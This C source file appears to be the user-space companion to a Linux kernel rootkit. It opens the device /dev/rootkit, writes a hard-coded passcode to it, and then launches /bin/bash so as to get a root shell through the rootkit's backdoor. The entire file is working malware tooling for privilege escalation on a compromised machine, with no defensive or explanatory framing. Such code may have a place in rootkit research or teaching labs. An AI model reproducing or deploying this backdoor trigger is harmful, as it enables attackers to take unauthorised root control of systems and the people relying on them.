#include <stdio.h>
#include <stdlib.h>

#define PLEASE_GIVE_ME_ROOT "please_give_me_root"

int main(void) {
	// open /dev/rootkit for writing and write the passcode
	FILE *fp = fopen("/dev/rootkit", "w");
	if (!fp) {
		puts("Error, /dev/rootkit couldn't open.");	
		puts("Is the rootkit module loaded?");	
		return 1;
	}

	fprintf(fp, PLEASE_GIVE_ME_ROOT);
	fflush(fp);

	// spawn shell as a root id
	puts("[+] root shell:");
	system("/bin/bash");
	return 0;
}
